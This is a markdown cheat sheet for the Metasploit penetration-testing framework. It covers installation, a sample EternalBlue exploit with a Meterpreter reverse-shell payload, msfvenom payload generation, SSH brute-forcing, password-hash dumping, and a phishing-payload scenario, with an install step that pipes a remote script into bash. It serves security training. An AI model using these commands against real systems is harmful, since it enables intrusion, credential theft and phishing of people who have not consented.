# Metasploit Framework 🔥💻🕵️‍♂️
#RED #Tool 

Metasploit Framework is an open-source penetration testing platform that enables security professionals to test system vulnerabilities, execute exploit code, and develop their own exploit tools.

**LINK TO TOOL DOCUMENTATION [HERE](https://www.metasploit.com/)**

The Metasploit Framework is one of the most widely used penetration testing tools in the cybersecurity industry. It provides a robust platform for identifying, exploiting, and validating vulnerabilities in various systems.

---
![Metasploit Framework](https://upload.wikimedia.org/wikipedia/commons/3/38/Metasploit_logo_and_wordmark.png)

---

### 🚀 Installing Metasploit Framework

#### 🔹 **LINUX** 🐧
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate | bash
```

#### 🔹 **Windows** 🏁
Download from: [Metasploit Framework](https://www.metasploit.com/download)

---

## 🧰 Common Commands

### Start Metasploit
```bash
msfconsole                
```

### Search for exploits related to Apache
```bash
search exploit apache     
```

### Use an exploit module
```bash
use exploit/windows/smb/ms17_010  
```

### Set target IP
```bash
set RHOST 192.168.1.100   
```

### Select payload
```bash
set PAYLOAD windows/meterpreter/reverse_tcp  
```

### Execute the exploit
```bash
exploit                   
```

### Interact with a compromised system
```bash
sessions -i 1             
```

### Additional Useful Commands:
```bash
show exploits             # Display available exploits
show payloads             # Display available payloads
show auxiliary            # Display auxiliary modules
show post                 # Display post-exploitation modules
use auxiliary/scanner/ssh/ssh_login  # Use SSH brute-force login module
set USERNAME admin        # Set a username for brute-force attack
set PASSWORD password123  # Set a password for brute-force attack
run                       # Execute the selected module
sessions -l               # List active sessions
sessions -k <session_id>  # Kill a specific session
background                # Move a session to background
exit                      # Exit Metasploit Framework
```

---

## ⚙️ Advanced Usage

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe  # Generate a payload
use auxiliary/scanner/portscan/tcp   # Perform a TCP port scan
use post/windows/gather/hashdump     # Dump password hashes after exploitation
```

---

## 📋 Handy Options

| Option         | Description                                    |
|---------------|--------------------------------|
| `-x`          | Run exploit and auto-interact with session |
| `-j`          | Run as background job                    |
| `-z`          | Skip interactive prompt after exploit    |
| `show options`| Display required settings for a module  |
| `setg`        | Set a global variable for all modules   |
| `resource`    | Run multiple Metasploit commands from a script |
| `db_nmap`     | Use Nmap from within Metasploit for scanning |
| `route`       | Manage pivoting and route traffic through compromised hosts |
| `exploit -z`  | Run exploit without interaction        |
| `jobs -K`     | Kill all running background jobs       |

---

## 🌐 Example Scenarios

- **Penetration Test**: Gain access to a system using an exploit and test security controls.
- **Post-Exploitation**: Extract credentials, capture keystrokes, or pivot within the network.
- **Red Teaming**: Simulate a real-world attack scenario and evaluate security defenses.
- **Social Engineering**: Craft malicious payloads for phishing campaigns.

---

## 🚀 Pro Tips

- Always update Metasploit before running tests: `msfupdate` 🔄
- Use `searchsploit` for offline exploit database searching 📖
- Combine Metasploit with Nmap for reconnaissance 🔍
- Use `setg` to set global options across multiple modules 🌍
- Leverage `resource` scripts to automate tasks ⚡

---

## 📚 References
- [Metasploit Documentation](https://docs.metasploit.com/)
- [Offensive Security Metasploit Course](https://www.offsec.com/metasploit-unleashed/)

---

![VIDEO](https://www.youtube.com/watch?v=3Kq1MIfTWCE)
